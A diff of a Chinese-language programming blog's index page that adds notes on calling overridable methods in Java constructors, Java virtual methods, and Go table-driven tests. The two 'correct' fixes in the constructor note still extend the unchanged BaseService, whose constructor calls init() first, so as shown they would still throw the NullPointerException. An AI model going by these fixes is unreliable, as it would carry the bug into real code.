@@ -69,6 +69,234 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-constructor-virtual-method-problem" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/note/2025/05/17/constructor-virtual-method-problem/" class="article-date">
+  <time class="dt-published" datetime="2025-05-17T06:03:46.000Z" itemprop="datePublished">2025-05-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/note/2025/05/17/constructor-virtual-method-problem/">constructor virtual method problem</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>在 Java 中，如果你在建構子內呼叫了一個「可以被子類覆寫」的方法（也就是虛擬方法 &#x2F; 非 <code>final</code> &#x2F; 非 <code>private</code> 的方法）</p>
+<p>而該方法實際上在子類中有實作，這會導致父類建構子呼叫時，<strong>執行的是子類的版本</strong></p>
+<p>但此時子類的欄位還沒初始化完成，可能發生以下問題：</p>
+<ul>
+<li><code>NullPointerException</code></li>
+<li>初始化邏輯錯誤</li>
+<li>難以除錯的 bug</li>
+</ul>
+<h2 id="範例：錯誤使用"><a href="#範例：錯誤使用" class="headerlink" title="範例：錯誤使用"></a>範例：錯誤使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Parent</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Parent constructor start&quot;</span>);</span><br><span class="line">        init(); <span class="comment">// 呼叫虛擬方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Parent constructor end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Parent init&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_">Parent</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Child</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Child constructor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Child init: &quot;</span> + message.length()); <span class="comment">// NPE 發生</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Child</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Child</span>();</span><br></pre></td></tr></table></figure>
+
+<h3 id="輸出結果"><a href="#輸出結果" class="headerlink" title="輸出結果"></a>輸出結果</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Parent constructor start</span><br><span class="line">Exception in thread &quot;main&quot; java.lang.NullPointerException</span><br></pre></td></tr></table></figure>
+
+<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>Java 的物件建構流程是：先執行父類別建構子 → 再執行子類別建構子</p>
+<p>但 init() 是 <code>virtual method</code>，因此在 Parent() 裡呼叫會走向 Child.init()</p>
+<p>而此時 Child 的建構子還沒開始跑 → 欄位尚未初始化</p>
+<h2 id="實務範例：Service-初始化失敗"><a href="#實務範例：Service-初始化失敗" class="headerlink" title="實務範例：Service 初始化失敗"></a>實務範例：Service 初始化失敗</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">BaseService</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BaseService</span><span class="params">()</span> &#123;</span><br><span class="line">        init(); <span class="comment">// 呼叫虛擬方法</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserService</span> <span class="keyword">extends</span> <span class="title class_">BaseService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userRepository = <span class="keyword">new</span> <span class="title class_">UserRepository</span>(); <span class="comment">// 尚未初始化</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        userRepository.connect(); <span class="comment">// 這裡會 NPE</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="正確寫法"><a href="#正確寫法" class="headerlink" title="正確寫法"></a>正確寫法</h2><h3 id="1-在子類-constructor-中主動呼叫"><a href="#1-在子類-constructor-中主動呼叫" class="headerlink" title="1. 在子類 constructor 中主動呼叫"></a>1. 在子類 constructor 中主動呼叫</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserService</span> <span class="keyword">extends</span> <span class="title class_">BaseService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserService</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userRepository = <span class="keyword">new</span> <span class="title class_">UserRepository</span>();</span><br><span class="line">        init(); <span class="comment">// 子類自行控制時機</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        userRepository.connect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-使用工廠模式或建構器（Builder）"><a href="#2-使用工廠模式或建構器（Builder）" class="headerlink" title="2. 使用工廠模式或建構器（Builder）"></a>2. 使用工廠模式或建構器（Builder）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserService</span> <span class="keyword">extends</span> <span class="title class_">BaseService</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserService</span><span class="params">(UserRepository userRepository)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userRepository = userRepository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">        userRepository.connect();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="避免錯誤的原則"><a href="#避免錯誤的原則" class="headerlink" title="避免錯誤的原則"></a>避免錯誤的原則</h2><table>
+<thead>
+<tr>
+<th>原則</th>
+<th>說明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>❌ 建構子內呼叫虛擬方法</td>
+<td>子類尚未初始化，可能導致 NPE</td>
+</tr>
+<tr>
+<td>✅ 在子類中手動呼叫</td>
+<td>子類控制初始化時機</td>
+</tr>
+<tr>
+<td>✅ 使用組合代替繼承</td>
+<td>避免虛擬呼叫的風險</td>
+</tr>
+<tr>
+<td>✅ 使用 <code>final</code> 或 <code>private</code> 方法</td>
+<td>保證建構期內方法不會被覆寫</td>
+</tr>
+</tbody></table>
+<h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>在 constructor 中呼叫會被覆寫的方法是 Java 中著名的設計陷阱。實務上應：</p>
+<ul>
+<li>儘量避免繼承中帶有邏輯的 constructor</li>
+<li>初始化責任應交給子類</li>
+<li>改用組合與明確初始化階段（例如 <code>init()</code>、<code>setup()</code> 方法）</li>
+</ul>
+<p>這樣可以讓程式碼更穩定、可預測、也更容易維護。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://z6wdc.github.io/note/2025/05/17/constructor-virtual-method-problem/" data-id="cmauf9m1v003mk2q9c9alcmwu" data-title="constructor virtual method problem" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/note/tags/Java/" rel="tag">Java</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-Java-virtual-method" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/note/2025/05/17/Java-virtual-method/" class="article-date">
+  <time class="dt-published" datetime="2025-05-17T05:51:56.000Z" itemprop="datePublished">2025-05-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/note/2025/05/17/Java-virtual-method/">Java virtual method</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>在 Java 中，虛擬方法（Virtual Method）是指在執行階段會根據「實際物件的類型」來動態決定要執行哪個方法實作的機制。</p>
+<p>這是物件導向程式設計中實現多型（polymorphism）的核心功能之一。</p>
+<h2 id="Java-的虛擬方法定義"><a href="#Java-的虛擬方法定義" class="headerlink" title="Java 的虛擬方法定義"></a>Java 的虛擬方法定義</h2><p>在 Java 中，<strong>除了 <code>static</code>、<code>private</code> 和 <code>final</code> 方法之外，所有的方法預設都是虛擬方法</strong>。也就是說，大多數的實例方法都會在執行時被動態繫結（dynamic dispatch）。</p>
+<h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul>
+<li>使用父類別參考指向子類別物件時，呼叫的方法會依照「實際物件的類型」決定。</li>
+<li>呼叫的決策發生在執行階段，而不是編譯階段。</li>
+<li>支援 override：子類別可以覆寫父類別的方法實作。</li>
+</ul>
+<h2 id="範例程式碼"><a href="#範例程式碼" class="headerlink" title="範例程式碼"></a>範例程式碼</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">speak</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal speaks&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">speak</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Dog barks&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();  <span class="comment">// 父類別參考指向 Dog 實體</span></span><br><span class="line">        a.speak();             <span class="comment">// 輸出：Dog barks</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>雖然變數 a 是 Animal 型別，但實際物件是 Dog，因此呼叫的是 Dog 類別中的 speak 方法。這就是虛擬方法的行為。</p>
+<h2 id="非虛擬方法（Non-Virtual-Method）"><a href="#非虛擬方法（Non-Virtual-Method）" class="headerlink" title="非虛擬方法（Non-Virtual Method）"></a>非虛擬方法（Non-Virtual Method）</h2><p>以下幾種方法不是虛擬方法，因為它們不支援 override 或不會被動態繫結：</p>
+<ul>
+<li>static 方法：屬於類別本身</li>
+<li>private 方法：僅能在定義該方法的類別中使用</li>
+<li>final 方法：不允許被子類別覆寫</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">privateMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal private&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">finalMethod</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Animal final&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="結論"><a href="#結論" class="headerlink" title="結論"></a>結論</h2><p>Java 中的虛擬方法機制是實現多型的關鍵。除非方法被聲明為 <code>static</code>、<code>final</code> 或 <code>private</code>，否則它預設就是虛擬的，會依照執行時的實際物件決定呼叫的版本。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://z6wdc.github.io/note/2025/05/17/Java-virtual-method/" data-id="cmauf9m0u000ik2q9gdqxfns4" data-title="Java virtual method" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/note/tags/Java/" rel="tag">Java</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-go-table-driven-test" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/note/2025/05/17/go-table-driven-test/" class="article-date">
+  <time class="dt-published" datetime="2025-05-17T05:45:38.000Z" itemprop="datePublished">2025-05-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/note/2025/05/17/go-table-driven-test/">go table-driven test</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Go 語言中，<code>table-driven test</code>（表格驅動測試）是一種非常常見且被推薦的測試寫法。</p>
+<p>這種風格強調「資料與邏輯分離」，能讓測試碼更簡潔、可維護性更高，特別適合處理多組輸入&#x2F;輸出測試案例。</p>
+<h2 id="為什麼要使用-Table-Driven-Test？"><a href="#為什麼要使用-Table-Driven-Test？" class="headerlink" title="為什麼要使用 Table-Driven Test？"></a>為什麼要使用 Table-Driven Test？</h2><p>當你要針對同一個函式測試多種情境時，若每個情境都手動撰寫重複的 <code>t.Run(...)</code>，程式碼會變得冗長、難以維護。使用 table-driven 測試可以：</p>
+<ul>
+<li>集中維護測試案例</li>
+<li>自動迴圈跑測試，避免重複程式碼</li>
+<li>提高可讀性與一致性</li>
+</ul>
+<h2 id="起源與推廣者"><a href="#起源與推廣者" class="headerlink" title="起源與推廣者"></a>起源與推廣者</h2><p>Table-driven test 並不是某個單一開發者發明的設計模式，而是由 Go 核心開發者 <strong>Andrew Gerrand</strong> 在多次演講與部落格中推廣的實踐方式。</p>
+<blockquote>
+<p>“In Go, we often use table-driven tests. They are a good way to test multiple scenarios without duplicating code.”<br>— Andrew Gerrand, Go Developer Advocate</p>
+</blockquote>
+<p>這種風格也出現在 Go 官方標準函式庫的測試檔案中，例如 <code>strings</code>, <code>strconv</code>, <code>time</code> 等，成為 idiomatic Go 的一部分。</p>
+<h2 id="實作範例：檢查通知類型是否有效"><a href="#實作範例：檢查通知類型是否有效" class="headerlink" title="實作範例：檢查通知類型是否有效"></a>實作範例：檢查通知類型是否有效</h2><p>以下是一個簡單的例子：驗證輸入的通知類型是否為 <code>email</code>、<code>push</code> 或 <code>sms</code>。</p>
+<h3 id="被測試的程式碼（notification-go）"><a href="#被測試的程式碼（notification-go）" class="headerlink" title="被測試的程式碼（notification.go）"></a>被測試的程式碼（<code>notification.go</code>）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package notification</span><br><span class="line"></span><br><span class="line">func IsValidNotificationType(t string) bool &#123;</span><br><span class="line">    switch t &#123;</span><br><span class="line">    case &quot;email&quot;, &quot;push&quot;, &quot;sms&quot;:</span><br><span class="line">        return true</span><br><span class="line">    default:</span><br><span class="line">        return false</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="測試檔案（notification-test-go）"><a href="#測試檔案（notification-test-go）" class="headerlink" title="測試檔案（notification_test.go）"></a>測試檔案（<code>notification_test.go</code>）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">package notification</span><br><span class="line"></span><br><span class="line">import &quot;testing&quot;</span><br><span class="line"></span><br><span class="line">func TestIsValidNotificationType(t *testing.T) &#123;</span><br><span class="line">    tests := []struct &#123;</span><br><span class="line">        name     string</span><br><span class="line">        input    string</span><br><span class="line">        expected bool</span><br><span class="line">    &#125;&#123;</span><br><span class="line">        &#123;&quot;valid_email&quot;, &quot;email&quot;, true&#125;,</span><br><span class="line">        &#123;&quot;valid_push&quot;, &quot;push&quot;, true&#125;,</span><br><span class="line">        &#123;&quot;valid_sms&quot;, &quot;sms&quot;, true&#125;,</span><br><span class="line">        &#123;&quot;invalid_type&quot;, &quot;fax&quot;, false&#125;,</span><br><span class="line">        &#123;&quot;empty_string&quot;, &quot;&quot;, false&#125;,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    for _, tt := range tests &#123;</span><br><span class="line">        t.Run(tt.name, func(t *testing.T) &#123;</span><br><span class="line">            actual := IsValidNotificationType(tt.input)</span><br><span class="line">            if actual != tt.expected &#123;</span><br><span class="line">                t.Errorf(&quot;IsValidNotificationType(%q) = %v; want %v&quot;, tt.input, actual, tt.expected)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解說重點"><a href="#解說重點" class="headerlink" title="解說重點"></a>解說重點</h2><ul>
+<li><code>tests := []struct&#123;...&#125;</code>：定義多筆測試資料</li>
+<li><code>t.Run(tt.name, ...)</code>：獨立執行每筆測試並標記名稱（更容易查錯）</li>
+<li>如果測試失敗，<code>t.Errorf</code> 會印出詳細資訊</li>
+</ul>
+<h2 id="延伸應用"><a href="#延伸應用" class="headerlink" title="延伸應用"></a>延伸應用</h2><p>Table-driven 測試也適用於：</p>
+<ul>
+<li>多種輸入條件組合測試（如邊界值測試）</li>
+<li>多個子函式共用邏輯測試</li>
+<li>單元測試與整合測試中的資料組合處理</li>
+</ul>
+<h2 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h2><p>Go 的 table-driven 測試風格簡單易讀、方便維護，是撰寫單元測試的最佳實踐之一。當你在寫測試時遇到需要覆蓋多種條件的情境，請優先考慮這種寫法。</p>
+<h2 id="參考來源"><a href="#參考來源" class="headerlink" title="參考來源"></a>參考來源</h2><ul>
+<li>Go Wiki - <a target="_blank" rel="noopener" href="https://go.dev/wiki/TableDrivenTests">“Table-Driven Tests”</a></li>
+<li>Andrew Gerrand, <a target="_blank" rel="noopener" href="https://talks.golang.org/2014/testing.slide">“Go testing techniques”</a></li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://z6wdc.github.io/note/2025/05/17/go-table-driven-test/" data-id="cmauf9m22004dk2q93cwpd3w8" data-title="go table-driven test" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/note/tags/Go/" rel="tag">Go</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-avro-overview-and-examples" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/note/2025/05/08/avro-overview-and-examples/" class="article-date">
@@ -139,7 +367,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/05/08/avro-overview-and-examples/" data-id="cmaf4t4y0003diwq839ac1qwy" data-title="avro overview and examples" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/05/08/avro-overview-and-examples/" data-id="cmauf9m1t003fk2q96eqcbewf" data-title="avro overview and examples" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -251,7 +479,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/05/05/gitmessage-guide/" data-id="cmaf4t4y60042iwq8b6pp8mm0" data-title="gitmessage guide" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/05/05/gitmessage-guide/" data-id="cmauf9m200046k2q91vzad7a4" data-title="gitmessage guide" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -335,7 +563,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/05/02/go-mock/" data-id="cmaf4t4y80046iwq81qjych75" data-title="go mock" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/05/02/go-mock/" data-id="cmauf9m21004ak2q97zthdz3y" data-title="go mock" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -455,7 +683,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/04/26/Go-Module/" data-id="cmaf4t4ww0008iwq8b8nnaxix" data-title="Go Module" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/04/26/Go-Module/" data-id="cmauf9m0o0008k2q9cbk4965i" data-title="Go Module" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -580,7 +808,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/04/26/go-install-vs-go-get/" data-id="cmaf4t4y70044iwq8fe67aa56" data-title="go install vs go get" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/04/26/go-install-vs-go-get/" data-id="cmauf9m210048k2q92nnq4jrl" data-title="go install vs go get" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -718,7 +946,7 @@ flowchart TD
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/04/05/Go-install/" data-id="cmaf4t4wy000aiwq8f2v6aky0" data-title="Go install" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://z6wdc.github.io/note/2025/04/05/Go-install/" data-id="cmauf9m0q000ak2q9az6obtgd" data-title="Go install" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -766,297 +994,7 @@ flowchart TD
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://z6wdc.github.io/note/2025/04/04/first-class-object/" data-id="cmaf4t4y2003liwq87zp65g92" data-title="first class object" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-CAP-Theorem" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/note/2025/04/02/CAP-Theorem/" class="article-date">
-  <time class="dt-published" datetime="2025-04-02T18:07:39.000Z" itemprop="datePublished">2025-04-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/note/2025/04/02/CAP-Theorem/">CAP Theorem</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>CAP 理論是由美國計算機科學家 Eric Brewer 提出，指出在一個<strong>分散式資料庫系統</strong>中，以下三者無法同時完全滿足，只能選擇其中兩個：</p>
-<ul>
-<li><strong>C：Consistency（一致性）</strong></li>
-<li><strong>A：Availability（可用性）</strong></li>
-<li><strong>P：Partition Tolerance（分區容忍性）</strong></li>
-</ul>
-<hr>
-<h2 id="三要素說明"><a href="#三要素說明" class="headerlink" title="三要素說明"></a>三要素說明</h2><h3 id="一致性（Consistency）"><a href="#一致性（Consistency）" class="headerlink" title="一致性（Consistency）"></a>一致性（Consistency）</h3><p>所有節點在同一時間看到的資料都是一致的。例如：使用者 A 寫入後，使用者 B 馬上讀到同樣的資料。</p>
-<h3 id="可用性（Availability）"><a href="#可用性（Availability）" class="headerlink" title="可用性（Availability）"></a>可用性（Availability）</h3><p>每個請求都能在合理時間內獲得回應，即使部分節點有問題也能繼續提供服務。</p>
-<h3 id="分區容忍性（Partition-Tolerance）"><a href="#分區容忍性（Partition-Tolerance）" class="headerlink" title="分區容忍性（Partition Tolerance）"></a>分區容忍性（Partition Tolerance）</h3><p>系統能容忍網路分區或節點之間通訊中斷的情況，仍然能繼續運作。</p>
-<hr>
